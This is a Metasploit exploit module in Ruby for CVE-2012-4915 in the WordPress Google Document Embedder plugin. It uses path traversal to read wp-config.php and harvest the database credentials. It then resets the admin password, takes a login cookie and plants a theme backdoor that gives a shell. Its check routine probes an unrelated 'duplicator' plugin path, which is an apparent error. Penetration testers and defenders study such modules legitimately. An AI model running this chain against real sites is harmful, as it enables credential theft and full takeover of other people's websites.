##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Wordpress

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WordPress Plugin Google Document Embedder Arbitrary File Disclosure',
			'Description'    => %q{
					This module exploits an arbitrary file disclosure flaw in the WordPress
				blogging software plugin known as Google Document Embedder. The vulnerability allows for
				database credential disclosure via the /libs/pdf.php script. The Google Document Embedder
				plug-in versions 2.4.6 and below are vulnerable. This exploit only works when the MySQL
				server is exposed on a accessible IP and Wordpress has filesystem write access.

				Please note: The admin password may get changed if the exploit does not run to the end.
			},
			'Author'         =>
				[
					'Charlie Eriksen',
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2012-4915'],
					['OSVDB', '88891'],
					['URL', 'http://secunia.com/advisories/50832'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jan 03 2013',
			'DefaultTarget'  => 0))
	end

	def check
		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => "#{self.plugins_path}duplicator/files/pdf.php",
		})

		if res and res.code == 200
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		print_status('Fetching wp-config.php')
		res = send_request_cgi({
			'method'     => 'GET',
			'uri'        => "#{self.plugins_path}google-document-embedder/libs/pdf.php",
			'vars_get'   =>
				{
					'fn'   => "#{rand_text_alphanumeric(4)}.pdf",
					'file' => "#{'../' * self.plugins_path.count('/')}wp-config.php",
				}
		})

		if res and res.body =~ /allow_url_fopen/
			fail_with(Exploit::Failure::NotVulnerable, 'allow_url_fopen and curl are both disabled')
		elsif res.code != 200
			fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
		end

		config = parse_wp_config(res.body)

		connect_to_wp_database()
		user = get_admin_user()

		new_password = rand_text_alphanumeric(8)
		set_user_password_hash(user[0], new_password)

		admin_cookie = get_wp_cookie(user[0], new_password)

		get_theme_backdoor()

		set_user_password_hash(user[0], user[1], false)

		print_status("Shell should have been acquired. Disabled backdoor")
	end

end

